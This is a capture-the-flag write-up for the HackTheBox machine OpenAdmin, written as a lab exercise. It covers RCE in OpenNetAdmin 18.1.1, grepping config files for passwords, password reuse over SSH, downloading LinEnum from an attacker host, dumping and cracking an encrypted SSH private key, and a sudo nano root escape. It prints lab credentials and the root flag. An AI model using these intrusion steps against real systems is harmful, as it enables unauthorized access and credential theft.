# HTB-OpenAdmin
My write up for the HackTheBox machine: OpenAdmin (10.10.10.171)

OpenAdmin was an easy and enajoyable machine to root.

The machine had a web application vulnerable to RCE, yielding a www-data shell.

The general process was:
Lazy system administrator escalation to user1 > CTF-like to user2 > nopasswd sudo privesc to root. 

## Lets get started!
As usual, I run nMap:
```console
root@kali:~# nmap -sV -T4 -sC 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-14 23:36 EST
Nmap scan report for 10.10.10.171
Host is up (0.0094s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Found HTTP on port 80 and SSH on port 22.

Visiting the page, apache shows me Ubuntu landing, so I learn the host is an Ubuntu system. 
I then attempted login via SSH using common creds which did not work.

## Dirb

```console
$ dirb http://10.10.10.171/
```
Running Dirb results in finding /artwork and /music

Looking around on /artwork, I can't see anying interesting.

Looking around on /music, I see a login button that links to OpenNetAdmin version 18.1.1.

Googling opennetadmin 18.1.1 shows it's vulnrable to RCE, I also find the exploit code (located in RCE.sh).

## RCE
Running:

```console
root@kali: ~./RCE.sh http://10.10.10.171/ona/
```

Gives me a shell:

```console
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
## Looting for credentials 
Now I have a restricted shell - I need to escalate privileges.

Grep to loot for passwords in apache config files:
```console
$ grep -nr 'pass' . 
Found a couple passwords:
../../ona/www/local/config/database_settings.inc.php:13:        'db_passwd' => n1nj4W4rri0R!',
./include/adodb5/drivers/adodb-postgres64.inc.php:757:  //      $db->PConnect("host=host1 user=user1 password=secret port=4341");
./include/adodb5/datadict/datadict-oci8.inc.php:111:            $password = isset($options['PASSWORD']) ? $options['PASSWORD'] : 'tiger';
```

I then try to login using the above passwords to the two user accounts on the machine.

```console
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```
'n1nj4W4rri0R!' Worked for Jimmy!
```console
root@kali:~# ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
Last login: Fri Jan 17 02:27:34 2020 from 10.10.14.49
jimmy@openadmin:~$
```
## Lets get enumerating!

I used LinEnum by running the following on the victim:

```console
jimmy@openadmin:/var/tmp$ wget 10.10.**.**:9000/LinEnum.sh
--2020-01-17 03:52:23--  http://10.10.**.**:9000/LinEnum.sh
Connecting to 10.10.**.**:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’
LinEnum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.01s   
2020-01-17 03:52:23 (3.66 MB/s) - ‘LinEnum.sh’ saved [46631/46631]

jimmy@openadmin:/var/tmp$ chmod +x LinEnum.sh
```

Looking through, I see apache and a curious file I wasn't able to see before at:

> /var/www/internal/main.php

The contents are:

```php
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
```
Hmm, I can't execute the .php file or access joanna's home directory - what can I do?

## cURL
I see on the LinEnum report it's listening at port 52846, so cURLing localhost:52846 dumps Joanna's SSH key!
```console
jimmy@openadmin:/var/www/internal$ curl -X POST http://127.0.0.1:52846/main.php -d "username=joanna"
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```
## Password cracking!

Now it's time to ask John.
```console
root@kali:~/Documents/OpenadminWriteup# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsahash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (?)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:03 DONE (2020-01-17 00:19) 0.2976g/s 4268Kp/s 4268Kc/s 4268KC/sa6_123..*7¡Vamos!
Session completed
```
John cracks the password: 

> bloodninjas

SSH into joanna's account:
```console
root@kali:~/Documents/OpenadminWriteup# ssh joanna@10.10.10.171 -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
```

## Final PrivEsc

Check what Joanna can run without supplying a password:
```console
joanna@openadmin:~$ sudo -l
User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
Joanna can use nano, so running:

```console 
joanna@openadmin:~$ sudo -u root nano /opt/priv
```

Gives me nano as root, CTRL-R + CTRL-X allows me to execute whatever I like with my new found privileges!

[In Nano]
```console
Command to execute: id 

uid=0(root) gid=0(root) groups=0(root)

Command to execute: cat /root/root.txt

2f907ed450b361b2c2bf4e8795d5b561
```

## Finished, thanks for reading!
